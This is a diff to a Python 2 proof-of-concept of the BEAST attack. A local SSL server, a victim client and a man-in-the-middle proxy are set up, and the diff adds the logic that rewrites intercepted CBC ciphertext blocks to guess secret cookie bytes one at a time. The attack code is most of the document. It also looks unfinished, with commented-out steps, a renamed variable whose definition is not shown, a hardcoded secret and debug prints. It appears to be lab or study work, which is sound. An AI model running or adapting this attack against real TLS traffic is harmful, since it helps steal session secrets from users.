@@ -2,6 +2,7 @@
 # -*- coding: utf-8 -*-
 
 import argparse
+import binascii
 import random
 import re
 import select
@@ -16,16 +17,18 @@ import time
 from utils.color import draw
 from pprint import pprint
 from struct import *
+from itertools import cycle, izip
 
 class SecureTCPHandler(SocketServer.BaseRequestHandler):
   def handle(self):
-    self.request = ssl.wrap_socket(self.request, keyfile="cert/localhost.pem", certfile="cert/localhost.pem", server_side=True, ssl_version=ssl.PROTOCOL_SSLv3)
+    self.request = ssl.wrap_socket(self.request, keyfile="cert/localhost.pem", certfile="cert/localhost.pem", server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
     #loop to avoid broken pipe
     while True:
         try:
             data = self.request.recv(1024)
             if data == '':
                 break
+            print map(''.join, zip(*[iter(data)]*16))
             self.request.send(b'OK')
         except ssl.SSLError as e:
             pass
@@ -70,7 +73,7 @@ class Client:
         self.proxy_port = port
         self.cookie = ''.join(random.SystemRandom().choice(string.uppercase + string.digits + string.lowercase) for _ in xrange(15))
         print draw("Sending request : ", bold=True, fg_yellow=True)
-        print draw("the secret is " + self.cookie + "\n\n",  bold=True, fg_yellow=True)
+        print draw("the secret is " + "Gyabscdefghicas" + "\n\n",  bold=True, fg_yellow=True)
 
     def connection(self):
         # Initialization of the client
@@ -86,7 +89,7 @@ class Client:
         for x in range(0,path):
             srt_path += 'A'
         try:
-            self.socket.sendall(b "the secret is " + srt_path + self.cookie)
+            self.socket.sendall(b"the secret is " + srt_path + "Gyabscdefghicas")
             msg = "".join([str(i) for i in self.socket.recv(1024).split(b"\r\n")])
         except ssl.SSLError as e:
             pass
@@ -124,9 +127,9 @@ class ProxyTCPHandler(SocketServer.BaseRequestHandler):
 
                     if data_altered is True:
                         (content_type, version, length) = struct.unpack('>BHH', data[0:5])
-                        if content_type == 23:
-                            beast.set_decipherable(True)
-                        data_altered = False
+                        #if content_type == 23:
+                            #exploit.set_decipherable(True)
+                        #data_altered = False
                     # we send data to the client
                     self.request.send(data)
 
@@ -147,9 +150,11 @@ class ProxyTCPHandler(SocketServer.BaseRequestHandler):
                         length_header = 32
 
                     if content_type == 23 and length > length_header:
-                        beast.set_length_frame(data)
-                        data = beast.alter()  
-                        data_altered = True  
+                        exploit.set_length_frame(data)
+                        data = exploit.alter() 
+                        check = binascii.hexlify(data)
+                        print map(''.join, zip(*[iter(check)]*16))
+                        #data_altered = True  
                     
                     # we send data to the server
                     socket_server.send(ssl_header+data)
@@ -188,43 +193,51 @@ class BEAST(Client):
         self.client = client
         self.length_block = 0
         self.start_exploit = False
+        self.start_alter = False
         self.decipherable = False
         self.request = ''
         self.byte_decipher = 0
+        self.length_frame = 0
+        self.block_decipher = 0
 
     def run(self):
-        self.client_connection()
-        self.size_of_block()
-        self.start_exploit = True
-        # disconnect the client to avoid "connection reset by peer"
         print "Start decrypting the request..."
-        self.exploit()
-        print '\n'
-        print draw("%r" %(self.request), bold=True, fg_yellow=True)
-        print '\n'
+        self.client_connection()
+
+        self.size_of_block()
+
+        add_byte = self.nb_byte_add()
+
+        self.start_exploit = True
+        self.send_request_from_the_client(add_byte)
+
+        self.start_exploit = False
+        self.start_alter = True
+        self.send_request_from_the_client(add_byte)
+
+        print ''
         self.client_disconect()
         return
 
-    def exploit(self):
-        # send a request
-        # get the size of a block
-        # place one byte of the secret alone
-        # send a request -
-        # IV = get the last block cipher
-        # call function get_previous_cipher
-            # get the previous cipher block of the block we want decrypt
-        # Guess = creat_Guess_block
-        # call function construct_first_block
-            # IV xor Guess xor Ci-1
-        # send request
-        # start exploit = true for alter function
-        # call function alter
-            # alter the first block of the request with result contruct first block
-        # check the result if Ci = Cj
-        # call function find_plaintext_byte
-        # call function shit_one_byte
-        # loop from the start
-        return
+    def xor(self, a,b):
+        result = int(a, 16) ^ int(b, 16) # convert to integers and xor them
+        return '{:x}'.format(result)  
+
+    def construct_first_block(self):
+        message = self.vector_init
+        key     = self.previous_cipher
+        guess   = self.create_guess()
+        cyphered = ''.join(chr(ord(c)^ord(k)) for c,k in izip(message, cycle(key)))
+        cyphered2 = ''.join(chr(ord(c)^ord(k)) for c,k in izip(cyphered, cycle(guess)))
+
+        return cyphered2
+
+    def create_guess(self, char=71):
+        length_path = self.length_block - self.block_decipher - 1
+        return 'A' * length_path + ''.join(['%c' % char])
+
+    def nb_byte_add(self):
+        return (self.length_block - len("the secret is ")) + (self.length_block - self.block_decipher - 1)
 
     def choosing_block(self, current_block):
         #in function of the path added in the request ~ we know the structure of the request
@@ -251,7 +264,18 @@ class BEAST(Client):
         self.decipherable = False
 
     def alter(self):
-        return 
+        if self.start_exploit is True:
+            self.frame = bytearray(self.frame)
+            self.vector_init = str(self.frame[-self.length_block:])
+            self.previous_cipher = str(self.frame[:self.length_block])
+            return str(self.frame)
+        elif self.start_alter is True:
+            self.frame = bytearray(self.frame)
+            block = self.construct_first_block()
+            for i in range(0,16):
+                self.frame[i] = block[i]
+            return str(self.frame)
+        return self.frame
 
     def set_decipherable(self, status):
         self.decipherable = status
@@ -289,7 +313,7 @@ if __name__ == '__main__':
     server.connection()
     spy.connection()
 
-    beast.run()
+    exploit.run()
 
     spy.disconnect()
     server.disconnect()
